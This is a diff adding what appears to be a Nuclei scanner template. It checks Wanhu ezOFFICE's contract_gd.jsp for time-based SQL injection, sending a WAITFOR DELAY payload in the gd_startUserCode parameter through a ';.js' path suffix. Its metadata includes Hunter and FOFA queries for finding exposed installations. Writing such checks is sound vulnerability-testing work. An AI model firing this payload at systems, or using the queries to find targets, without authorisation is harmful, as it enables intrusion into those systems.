@@ -1,0 +1,29 @@
+id: wanhu-ezoffice-contract_gd-sqli
+info:
+  name: 万户 ezoffice contract_gd.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/8ebce0929148d8e44ba68c777ccf0c28a8f38b7e/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7ezOFFICE-contract_gd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,sqli,oa,time,ezoffice
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A6%27-- HTTP/1.1
+        Host: {{Hostname}}
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - duration >= 5 && duration < 9
+        condition: and
